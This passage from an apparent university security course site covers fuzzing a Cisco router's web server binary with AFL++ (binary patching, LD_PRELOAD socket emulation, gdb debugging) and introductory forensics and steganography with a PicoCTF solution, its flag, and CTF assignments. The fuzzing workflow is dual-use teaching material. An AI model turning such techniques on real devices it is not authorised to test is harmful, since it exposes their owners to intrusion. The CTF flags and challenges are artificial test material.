quitting. This way we can know which request, if any, crashes the web server.</p> <p>To close a socket, <code>httpd</code> calls the <code>close</code> function. There are three locations from where close is called.</p> <p></p> <p>Among them, we need to modify the one at <code>231c0</code> to call <code>exit(0)</code> instead of <code>close</code>.</p> <p></p> <p>To patch the instructions we will use Cutter which is a GUI for radare2. Ghidra also supports patching binaries but Cutter is better suited for this use case.</p> <p>Navigating to <code>0x231c0</code> in Cutter, we come across the following disassembly.</p> <p></p> <p>Double-clicking on <code>close</code> takes us to <code>0x106b4</code>.</p> <p></p> <p>The <code>exit</code> function is located at <code>0x10b64</code>.</p> <p></p> <p>We can thus change <code>bl close</code> to <code>bl 0x10b64</code> to call the <code>exit</code> function instead.</p> <p></p> <p>The instruction immediately before can be changed from <code>mov r0, sl</code> to <code>eor r0, r0</code> which sets register <code>r0</code> to <code>0</code> to give us the following disassembly.</p> <p></p> <p>The net effect is that it calls <code>exit(0)</code>.  The other change we need to do is patch out the <code>daemon</code> call at <code>0x22CB4</code>.</p> <p></p> <p>We can change the instruction to <code>eor r0, r0</code> to make the application believe the call succeeded.</p> <p></p> <p>Finally, with the changes in place go to File -&gt; Commit changes to save the modifications. Let's rename the file to httpd_patched.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#testing-patched-httpd","title":"Testing patched httpd","text":"<p>Running httpd_patched we can see that it doesn\u2019t fork to the background.</p> <p></p> <p>Additionally, it quits after processing a single request as shown below.</p> <p></p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#setting-up-desockmulti","title":"Setting up desockmulti","text":"<p>We need to use an ARM cross-compiler to compile desockmulti. The armv7-eabihf-uclibc toolchain from bootlin works great for this purpose. We need to use a uclibc-based toolchain as the firmware binaries also use the same. Running the file command on /usr/bin/httpd points out the binary is dynamically linked to ld-uClibc.</p> <pre><code>$ file usr/sbin/httpd\nusr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped\n</code></pre> <p>Before compiling desockmulti, we have to make a tiny change to its source.</p> <pre><code>$ git diff\ndiff --git a/desockmulti.c b/desockmulti.c\nindex 719e6ac..6bcc223 100644\n--- a/desockmulti.c\n+++ b/desockmulti.c\n@@ -450,7 +450,7 @@ int socket(int domain, int type, int protocol)\n                pthread_mutex_unlock(&amp;mutex);\n        }\n\n-       setup_timer();\n+       //setup_timer();\n\n        if ((fd = original_socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0) {\n                perror(\"socket error\");\n</code></pre> <p>In desockmulti.c there\u2019s a call to a <code>setup_timer</code> function that needs to be commented out as shown in the diff above.</p> <p>We can then run make specifying the path to the arm-linux-gcc compiler in the <code>CC</code> environment variable.</p> <pre><code>$ make CC=~/armv7-eabihf--uclibc--stable-2020.08-1/bin/arm-linux-gcc      \n</code></pre> <p>The generated file desockmulti.so can be copied to the squashfs-root directory.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#testing-desockmulti","title":"Testing desockmulti","text":"<p>To test that desockmulti is indeed working as expected we can debug httpd with gdb-multiarch. First, we need to add a dependency to the library libpthread.so.0 using patchelf. Patchelf can be installed using apt. This is necessary as desockmulti uses threads while httpd doesn\u2019t link to libpthread by default.</p> <pre><code>$ patchelf --add-needed ./lib/libpthread.so.0 ./usr/sbin/httpd_patched\n</code></pre> <p>In terminal 1, run the binary in qemu specifying the -g parameter.</p> <pre><code>ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ sudo qemu-arm-static -g 5555 -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched\n-p 8080 &lt; ../../base-login-request.txt\n</code></pre> <p>The path to desockmulti.so is specified in the <code>LD_PRELOAD</code> environment variable. The other variable <code>USE_RAW_FORMAT</code> is specific to desockmulti.</p> <p>In another terminal, we can start gdb-multiarch, set a breakpoint on <code>fprintf</code>, and attach it to port 5555.</p> <pre><code>$ gdb-multiarch -q ./usr/sbin/httpd\nGEF for linux ready, type `gef' to start, `gef config' to configure\n95 commands loaded for GDB 9.2 using Python engine 3.8\n[*] 1 command could not be loaded, run `gef missing` to know why.\nReading symbols from ./usr/sbin/httpd...\n(No debugging symbols found in ./usr/sbin/httpd)\ngef\u27a4  b fprintf\nBreakpoint 1 at 0x10a38\ngef\u27a4  target remote :5555\n\u2026\ngef\u27a4  c\n</code></pre> <p>When the breakpoint on <code>fprintf</code> hits we can press c and continue for a couple of times to finally inspect the contents of the register <code>r2</code>.</p> <pre><code>0xfffe5fa8\u2502+0x0018: 0x30303220  \u2192  0x30303220\n0xfffe5fac\u2502+0x001c: 0x0d6b4f20  \u2192  0x0d6b4f20\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:arm:ARM \u2500\u2500\u2500\u2500\n   0xff4eb7b8 &lt;fprintf+4&gt;      push   {lr}              ; (str lr,  [sp,  #-4]!)\n   0xff4eb7bc &lt;fprintf+8&gt;      add    r2,  sp,  #8\n   0xff4eb7c0 &lt;fprintf+12&gt;     ldr    r1,  [sp,  #4]\n \u2192 0xff4eb7c4 &lt;fprintf+16&gt;     bl     0xff4ee024 &lt;vfprintf&gt;\n   \u21b3  0xff4ee024 &lt;vfprintf+0&gt;     push   {r4,  r5,  r6,  r7,  r8,  lr}\n      0xff4ee028 &lt;vfprintf+4&gt;     mov    r5,  r0\n      0xff4ee02c &lt;vfprintf+8&gt;     ldr    r6,  [r0,  #76]        ; 0x4c\n      0xff4ee030 &lt;vfprintf+12&gt;    ldr    r12,  [pc,  #144]      ; 0xff4ee0c8 &lt;vfprintf+164&gt;\n      0xff4ee034 &lt;vfprintf+16&gt;    cmp    r6,  #0\n      0xff4ee038 &lt;vfprintf+20&gt;    add    r12,  pc,  r12\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 arguments (guessed) \u2500\u2500\u2500\u2500\nvfprintf (\n   $r0 = 0x000be3c0 \u2192 0xff006085 \u2192 0xff006085,\n   $r1 = 0x00093f5c \u2192 0x00007325 \u2192 0x00007325,\n   $r2 = 0xfffe5f98 \u2192 0xfffe5fa0 \u2192 0x50545448 \u2192 0x50545448,\n   $r3 = 0x000006c8 \u2192 0x000006c8\n)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500\n[#0] Id 1, stopped 0xff4eb7c4 in fprintf (), reason: BREAKPOINT\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500\n[#0] 0xff4eb7c4 \u2192 fprintf()\n[#1] 0x1dd5c \u2192 add sp,  sp,  #1004      ; 0x3ec\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/s *$r2\n0xfffe5fa0:     \"HTTP/1.1 200 Ok\\r\\n\"\n</code></pre> <p>R2 points to a readable string \"HTTP/1.1 200 Ok\\r\\n\" which is the first line of a typical HTTP response. This indicates that desockmulti is working. We are not able to see the HTTP response on-screen but nevertheless, it's working as intended.</p> <p>At this point we can start fuzzing httpd_patched however, we can further make quality-of-life improvements. For example, the binary requires root to run. It prints the following error message if started without root.</p> <pre><code>ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ qemu-arm-static -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched -p 8080 &lt; ../../base-login-request.txt\n===&gt;HTTPD : scheduler set RR with proirity = 99 FAILED\n--- [1640588459:322474] accept_num=1, connect_num=0\n--- [1640588459:323006] Get pkt, sockindex=0, length=943, pkt[0]=80\n+++ [1640588459:323333] Intercepted socket()! original type=AF_INET6 fd=4\n--- [1640588459:323785] preeny socket bound, Emulating bind on port 8080\n--- [1640588459:324011] preeny listen called, accepting connections ...\n--- [1640588459:324223] preeny connect_write for serverfd=4 started\n--- [1640588459:324466] preeny connect succeeds, write for serverfd=4, client sock index=0\n--- [1640588459:324778] preeny write a 943 bytes packet, client socket index = 0, client sockfd=5\n--- [1640588459:325074] preeny connection for serverfd=4 client sockfd=5 shutdown\n--- [1640588459:325151] pthread_created or directly called for preeny_connect_write, accept_done_num 1, selected_fd_index 0  \n+++ [1640588459:325246] Intercepted socket()! original type=AF_INET6 fd=6\n--- [1640588459:325334] preeny socket bound, Emulating bind on port 8080\n--- [1640588459:325393] preeny listen called, accepting connections ...\n+++ [1640588459:325488] Intercepted socket()! original type=AF_INET fd=7\n--- [1640588459:325725] preeny socket bound, Emulating bind on port 8080\n--- [1640588459:325747] preeny listen called, accepting connections ...\n+++ [1640588459:325976] Intercepted socket()! original type=AF_INET fd=8\n--- [1640588459:326095] preeny socket bound, Emulating bind on port 81       \n--- [1640588459:326118] preeny listen called, accepting connections ...      \n+++ [1640588459:326480] Intercepted socket()! original type=AF_INET6 fd=9    \n--- [1640588459:329767] preeny socket bound, Emulating bind on port 81       \n--- [1640588459:329820] preeny listen called, accepting connections ...      \n/var/run/httpd.pid: Permission denied\n+++ [1640588459:330676] shutting down desockmulti...\n+++ [1640588459:330844] ... shutdown complete!\n</code></pre> <p>It fails on trying to access /var/run/httpd.pid. We can patch the binary and change the path to something which doesn\u2019t require root privilege to access. This can be done using a hex editor and also with Cutter.</p> <p></p> <p>We can change /var/run/httpd.pid to /home/ubuntu/h.pid and save. The new path is located under the home directory and can be accessed without root. It\u2019s also important to note the length of the replacement string must be less than or equal to the original.</p> <p></p> <p>Rerunning httpd_patched we can see it doesn\u2019t show the permission denied error anymore.</p> <pre><code>ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ qemu-arm-static -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched -p 8080 &lt; ../../base-login-request.txt\n===&gt;HTTPD : scheduler set RR with proirity = 99 FAILED\n--- [1640594090:533269] accept_num=1, connect_num=0\n--- [1640594090:533738] Get pkt, sockindex=0, length=943, pkt[0]=80\n+++ [1640594090:533930] Intercepted socket()! original type=AF_INET6 fd=4\n--- [1640594090:534277] preeny socket bound, Emulating bind on port 8080\n--- [1640594090:534400] preeny listen called, accepting connections ...\n--- [1640594090:534562] preeny connect_write for serverfd=4 started\n--- [1640594090:534704] preeny connect succeeds, write for serverfd=4, client sock index=0\n--- [1640594090:534880] preeny write a 943 bytes packet, client socket index = 0, client sockfd=5\n--- [1640594090:535045] preeny connection for serverfd=4 client sockfd=5 shutdown\n--- [1640594090:535144] pthread_created or directly called for preeny_connect_write, accept_done_num 1, selected_fd_index 0\n+++ [1640594090:535228] Intercepted socket()! original type=AF_INET6 fd=6\n--- [1640594090:535283] preeny socket bound, Emulating bind on port 8080\n--- [1640594090:535316] preeny listen called, accepting connections ...\n+++ [1640594090:535359] Intercepted socket()! original type=AF_INET fd=7\n--- [1640594090:535389] preeny socket bound, Emulating bind on port 8080\n--- [1640594090:535404] preeny listen called, accepting connections ...\n+++ [1640594090:535432] Intercepted socket()! original type=AF_INET fd=8\n--- [1640594090:535478] preeny socket bound, Emulating bind on port 81\n--- [1640594090:535511] preeny listen called, accepting connections ...\n+++ [1640594090:535559] Intercepted socket()! original type=AF_INET6 fd=9\n--- [1640594090:535601] preeny socket bound, Emulating bind on port 81\n--- [1640594090:535632] preeny listen called, accepting connections ...\n--- [1640594090:537111] Accept socket at serverfd=4, got fd=10, accept_sock_num=1.\n+++ [1640594090:550073] shutting down desockmulti...\n+++ [1640594090:550229] ... shutdown complete!\n</code></pre> <p>Additionally, the file h.pid is created within the user's home directory.</p> <pre><code>$ ls -la /home/ubuntu/h.pid\n-rw-rw-r-- 1 ubuntu ubuntu 4 Dec 27 08:34 /home/ubuntu/h.pid\n</code></pre>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-httpd","title":"Fuzzing httpd","text":"<p>We can now finally proceed to fuzz the patched httpd binary. We need to create two directories: input-httpd and output-httpd. The former will contain the file base-login-request.txt which AFL++ will use to generate further test cases.</p> <pre><code>ubuntu@fuzz:~/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ QEMU_LD_PREFIX=.. QEMU_SET_ENV=USE_RAW_FORMAT=1,LD_PRELOAD=../desockmulti.so ../../../AFLplusplus/afl-fuzz -Q -i ../../input-httpd/ -o ../../output-httpd/ -- ../usr/sbin/httpd_patched -p 8080\n</code></pre> <p></p> <p>We can leave the fuzzer as is to continue fuzzing. To quit press Ctrl+C anytime. In our brief test, AFL++ wasn\u2019t able to crash the application.</p> <p>With this, we come to the end of the two-part AFL fuzzing series. In the first part, we saw how to fuzz simple binaries which accepted input from a file. They required no modifications and were straightforward to fuzz. In this part, we learned how to convert a socketed binary to accept input from a file instead. This required patching the binary on an assembly level and using LD_PRELOAD further to override libc functions. We also saw how to use radamsa to generate test cases as a crude way to fuzz. There is no universal technique that can be applied as-is to fuzz any given closed IoT firmware binary. It will vary on a case-by-case basis but the idea is similar. For any comments, questions or suggestions feel free to leave a comment below.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#reference","title":"Reference","text":"<p>Barun (2022) Fuzzing IOT binaries with AFL++ - part I, Attify Blog - IoT Security, Pentesting and Exploitation. Attify Blog - IoT Security, Pentesting and Exploitation. Available at: https://blog.attify.com/fuzzing-iot-devices-part-1/ (Accessed: October 31, 2022). </p> <p>Barun (2022) Fuzzing IOT binaries with AFL++ - part II, Attify Blog - IoT Security, Pentesting and Exploitation. Attify Blog - IoT Security, Pentesting and Exploitation. Available at: https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/ (Accessed: October 31, 2022). </p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#1-easy-liar","title":"(1 - easy) liar","text":"<p>Give me some number:</p> <p>http://116.7.234.225/files/7a4de0b926cda8e43285c4373b68cd23/liar</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#2-easy-ezreverse","title":"(2 - easy) ezreverse","text":"<p>Give me some string with lowercase letter and number</p> <p>http://116.7.234.225/files/5fbc944afb51241104f3b95605de2436/ezreverse</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#3-easy-luckyguess","title":"(3 - easy) LuckyGuess","text":"<p>Hook the binary</p> <p>http://116.7.234.225/files/ffdaed751038587f1ea6a9c9552b0452/LuckyGuess</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/","title":"Lab 7: Forensics and Steganography Part I","text":"<p>bi0s wiki: https://teambi0s.gitlab.io/bi0s-wiki/</p> <p></p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#introduction","title":"Introduction","text":""},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#what-is-cyber-forensics","title":"What is Cyber Forensics?","text":"<p>Cyber Forensics is a science that deals with techniques used to track the footprints left behind by a cyber attack. Cyber forensics is directly linked to any cybercrime which has data loss and recovery. Some examples include investigation on possible forged digital signatures, the authenticity of images, analysis of malicious software, etc.</p> <p>Quote</p> <p>Cyber Forensics is a science that deals with techniques used to track the footprints left behind by a cyber attack.</p> <p>Let us go into more detail about the definition from a CTF perspective. Any Capture The Flag contest usually has three prime categories of digital forensics. They are:</p> <ul> <li>Network Forensics</li> <li>Image Forensics</li> <li>Memory Forensics</li> </ul>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#scope-of-forensics","title":"Scope of Forensics","text":"<p>When we talk about employment, research, or anything, Cyber Forensics is one of the prime areas which comes into a security analyst's mind. Forensics is strongly employed in Incident Response, Malware Analysis, and Data leak protection. To sum it up, every cybercrime is always related to cyber forensics.</p> <p>To understand this, let us look into a very dangerous virus attack that almost started world war III. Stuxnet was a virus that was found lurking in the systems which controlled nuclear centrifuges in Iran. Stuxnet had a stolen yet officially authorized digital signature which acted as a very good camouflage. Stuxnet made the windows systems constantly reboot or lead them to Blue Screen of Death. Stuxnet could easily affect any computer which was linked to the network. It was really difficult for security experts to trace it. It severely affected the SCADA systems which were employed in maintaining the rotation speed of the centrifuges. After heavy investigation, when several forensic analysts looked into the SCADA network transfer, they found a malicious program being run that altered the system processes. The main aspect which made Stuxnet almost invisible was that it became active only when its target was present or being run. Until then the virus remained dormant. So as you can see, Cyber forensics played a huge role in the detection of the virus.</p> <p>Let us look at the trend of cyber-attacks based on the analysis from January 2017-2018:</p> <p>Some handy definitions:</p> <ol> <li>Cyber Espionage: Use of computer networks to get access to confidential information held by important organizations.</li> <li>Hacktivism: Act of hacking which is mainly done for a political purpose.</li> <li>Cyber Warfare: Cyber attacks are done on state organizations to gain military secrets etc.</li> </ol> <p> Cyber crimes are at 77% in 2017</p> <p>Now let us look at January 2018: </p> <p>So as you can see, the percentage has increased at an alarming rate.</p> <p>So, folks, I hope you understand just how important cyber forensics is in the current world of cybersecurity.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#image-forensics","title":"Image Forensics","text":""},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#introduction_1","title":"Introduction","text":""},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#what-is-image-forensics","title":"What is Image Forensics?","text":"<p>To keep it very simple and straight, Image Forensics is a specific branch of cyber forensics that deals with various numbers of attacks.</p> <p>Some of them include:</p> <ol> <li>The authenticity of an image</li> <li>When we speak of authenticity, we are talking about whether the image is properly structured or not. Sometimes the data preserved inside may tamper with. Forensic analysts are required to recover this tampered data to its original state.</li> <li>Detection of possible forgeries etc.</li> <li>Detecting forgeries of images is a really big thing in the tech industry because many confidential images or files may be stolen or unlawfully used for criminal purposes.</li> </ol> <p>So let us look into some of the very basic definitions of the technical terms used in this field to better understand the upcoming topics.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#file-signature","title":"File Signature","text":"<p>A typical file signature is something that defines the nature of a file and also tells us about the specific features of the particular file. This is also called the file header or sometimes the checksum.</p> <p>So let us look at some examples:</p> <ol> <li>PNG -&gt; 89 50 4E 47 0D 0A 1A 0A</li> <li>ZIP FILE -&gt; 50 4B 03 04 or 50 4B 05 06</li> </ol> <p>The 'hex' values shown are also called magic numbers.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#chunks","title":"Chunks","text":"<p>Chunks are nothing but fragments of information used by different multimedia formats like PNG, MP3, etc. Each chunk has its header. The header usually describes the type and size of the chunk.</p> <p></p> <p>How important are chunks ?</p> <p>So let us consider that you are trying to open an image using an MP3 player. Will the player open the image? No, right. It'll give me an error message. Every application has a decoder that checks the type of chunks given. When it recognizes that the given chunks are supported, it tries to give the desired output. So whenever it comes across chunks of unknown format, it triggers an error message stating \"Unsupported File Format\"</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#checksum","title":"Checksum","text":"<p>The checksum is an integer value that represents the sum of correct digits in a piece of data. Checksums help us to check the data integrity of a file that is transmitted across the digital network. There are many checksum algorithms. Checksum algorithms are employed in various cybersecurity concepts like fingerprinting, cryptographic hash functions, etc.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#lossless-compression","title":"Lossless Compression","text":"<p>The name itself tells that there will be no loss of information when a set of data is compressed. the lossless compression technique is used for reducing the data size for storage. For example, png is a lossless compression and the advantage of a lossless compression file format is that there is no loss of quality each time it is opened or saved.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#lossy-compression","title":"Lossy Compression","text":"<p>In lossy compression, it involves loss of information from the original file when data is compressed. Lossy compression can result in a smaller size of the file but it also removes some original pixels, video frames, and sound waves forever. For example, JPEG is a lossy compression and the disadvantage is that each time the image is saved it loses some amount of data and which simultaneously degrades the image quality.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#metadata-of-an-image","title":"Metadata Of An Image:","text":"<p>Image metadata is a piece of text information that gives information about the details associated with the image. Some of these details are + Size and resolution + The author of the image + The GPS data of this image + The time when the image was taken, the last modification, etc.</p> <p>So now let us look at the file format of a PNG image:</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#portable-network-graphics-png","title":"Portable Network Graphics (PNG)","text":"<p>A PNG is a graphical file format of an image that supports lossless compression.</p> <p>Magic Number -&gt; 89 50 4E 47 0D 0A 1A 0A</p> <p> So now let us look at the critical chunks of a PNG image:</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#critical-chunks","title":"Critical chunks","text":"<p>IHDR -&gt; Describes image dimensions, color type, bit depth, etc. It must be noted that this must be the first chunk (always).</p> <p>PLTE -&gt; Contains the list of colors.</p> <p>IDAT -&gt; Contains the image data.</p> <p>IEND -&gt; Marks the end of the image.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#ancillary-chunks","title":"Ancillary chunks","text":"<p>Ancillary chunks can be otherwise called optional chunks. These are the chunks that are generally ignored by decoders. Let us look at some examples:</p> <p>bKGD -&gt; Gives the default background color.</p> <p>dSIG -&gt; This chunk is used to store the digital signature of the image.</p> <p>pHYS -&gt; Holds the pixel size and the ratio of dimensions of the image.</p> <p>All the ancillary chunks start with a small letter.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#executable-and-linkable-format-elf","title":"Executable and Linkable Format (ELF)","text":"<p>The ELF file format is a standard file format for executables, object codes, core dumps, etc. for any UNIX-based system.</p> <p>Magic Number -&gt; 7F 45 4c 46</p> <p>The file header of an ELF file defines whether to use 32-bit or 64-bit addresses. ELF files are generally analyzed using a tool called readelf.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#zip","title":"ZIP","text":"<p>Zip is a file format that supports lossless data compression. This file format achieves the compression of a file(s) using several compression algorithms. DEFLATE is the most used compression algorithm. Zip files have the file extension .zip or .ZIP.</p> <p>Magic Number -&gt; 50 4B 03 04 and 50 4B 05 06(for empty zip files)</p> <p></p> <p>Zip files can be extracted using this command in the terminal.</p> <pre><code>$ unzip file_name.zip\n</code></pre>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#least-significant-bit-encoding","title":"Least Significant Bit Encoding","text":""},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#definition","title":"Definition","text":"<p>What is LSB ?</p> <p>LSB, the least significant bit is the lowest in a series of numbers in binary; which is located at the far right of a string. For example, in the binary number: 10111001, the least significant bit is the far right 1.</p> <p>As binary numbers are largely used in computing and other related areas, wherein the least significant bit holds importance, especially when it comes to the transmission of binary numbers.</p> <p>Digital data is computed in binary format, where the rightmost digit is considered the lowest digit whereas the leftmost is considered the highest digit. In positional notation, the least significant bit is also known as the rightmost bit. It is the opposite of the most significant bit, which carries the highest value in a multiple-bit binary number as well as the number which is farthest to the right. In a multi-bit binary number, the significance of a bit decreases as it approaches the least significant bit. Since it is binary, the most significant bit can be either 1 or 0. The least significant bit is frequently employed in hash functions, checksums, and pseudorandom number generators.</p> <p>When transmission of binary data is being done, the least significant bit is the one that is transmitted first, followed by other bits of increasing significance.</p> <p>The number of image pixels in a PNG file is generally composed of RGB three primary colors (red, green, and blue). Each color occupies 8 bits, and the value ranges from 0x00 to 0xFF, that is, there are 256 colors, which contain a total of 256 to the third power. Thus there are 16777216 colors in total.</p> <p>The human eye can distinguish about 10 million different colors, which means that the human eye can't distinguish the remaining 6 million colors. LSB steganography is to modify the lowest binary bit (LSB) of RGB color components, each color will have 8 bits, LSB steganography is to modify the lowest bit in the number of pixels, and human eyes will not notice before and after this change, each pixel can carry 3 bits of information.</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#example","title":"Example","text":""},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#picoctf_2017-little-school-bus","title":"PicoCTF_2017: Little School Bus","text":"<p>Description:</p> <p>Can you help me find the data in this Little-School-Bus?</p> <p>Hint:</p> <p>Look at least a significant bit of encoding!!</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#solution","title":"Solution","text":"<p>As the Hint suggests the problem is related to LSB Encoding, The leftmost digit in binary is called the LSB digit</p> <p>As mentioned earlier LSB encoding is done by changing the LSB bit of the color, however, this slight variation is not noticeable. Thus by changing the LSB bit, we can hide data inside a file.</p> <pre><code>xxd -b ./littleschoolbus.bmp | head -n 20\n</code></pre> <p>Gives,</p> <pre><code>00000000: 01000010 01001101 11100010 01001011 00000010 00000000  BM.K...\n00000006: 00000000 00000000 00000000 00000000 00110110 00000000  ....6.\n0000000c: 00000000 00000000 00101000 00000000 00000000 00000000  ..(...\n00000012: 11111100 00000000 00000000 00000000 11000111 00000000  ......\n00000018: 00000000 00000000 00000001 00000000 00011000 00000000  ......\n0000001e: 00000000 00000000 00000000 00000000 10101100 01001011  .....K\n00000024: 00000010 00000000 00000000 00000000 00000000 00000000  ......\n0000002a: 00000000 00000000 00000000 00000000 00000000 00000000  ......\n00000030: 00000000 00000000 00000000 00000000 00000000 00000000  ......\n00000036: 11111110 11111111 11111111 11111110 11111110 11111111  ......\n0000003c: 11111111 11111110 11111110 11111111 11111111 11111110  ......\n00000042: 11111111 11111111 11111110 11111110 11111110 11111111  ......\n00000048: 11111111 11111110 11111110 11111110 11111110 11111111  ......\n0000004e: 11111110 11111111 11111111 11111110 11111110 11111111  ......\n00000054: 11111111 11111111 11111110 11111111 11111111 11111111  ......\n0000005a: 11111111 11111110 11111111 11111111 11111110 11111111  ......\n00000060: 11111111 11111111 11111110 11111110 11111111 11111110  ......\n00000066: 11111110 11111111 11111111 11111110 11111110 11111111  ......\n0000006c: 11111110 11111111 11111110 11111111 11111111 11111110  ......\n00000072: 11111111 11111111 11111110 11111111 11111110 11111111  ......\n</code></pre> <p>Taking the LSB bit after the many zeros,</p> <pre><code>00000036: 11111110 11111111 11111111 11111110 11111110 11111111  ......\n0000003c: 11111111 11111110 11111110 11111111 11111111 11111110  ......\n00000042: 11111111 11111111 11111110 11111110 11111110 11111111  ......\n00000048: 11111111 11111110 11111110 11111110 11111110 11111111  ......\n</code></pre> <p>8 bit gives</p> <pre><code>01100110 01101100\n</code></pre> <p>Which in ASCII is <code>fl</code>?</p> <p>Now we script,</p> <pre><code>binary_data = open(\"littleschoolbus.bmp\",\"rb\") # Open the file binary mode\nbinary_data.seek(54)  #seek to 54 bytes these bytes do not contain any data\ndata = binary_data.read() # read the binary data\nl = []\nfor i in data:\n    l.append(bin(i)[-1])  #make a list of LSB bit\nfor i in range(0,500,8):\n    print(chr(int(''.join(l[i:i+8]),2)),end='') # print the character\n</code></pre> <p>Which gives the flag !!</p> <p>flag{remember_kids_protect_your_headers_afb3}</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#footnote","title":"Footnote :","text":"<ol> <li>LSB</li> <li>Python Binary File I/O</li> </ol>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#assignment","title":"Assignment","text":"<p>Let's play with some real CTF challenges!</p> <p>Buckeye CTF 2022</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#1-easy-what-you-see-is-what-you-git","title":"(1 - easy) what-you-see-is-what-you-git","text":"<p>Author: matthewa26</p> <p>I definitely made a Git repo, but I somehow broke it. Something about not getting a HEAD of myself.</p> <p>Downloads: what-you-see-is-what-you-git</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#2-easy-sus","title":"(2 - easy) sus","text":"<p>Author: gsemaj</p> <p>Something about this audio is pretty sus...</p> <p>Hint: The crackling in the audio should tell you that something's wrong.</p> <p>Downloads: sus.wav</p>"},{"location":"CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/#3-medium-keyboardwarrior","title":"(3 - medium) keyboardwarrior","text":"<p>Author: v0rtex</p> <p>I found a PCAP of some Bluetooth 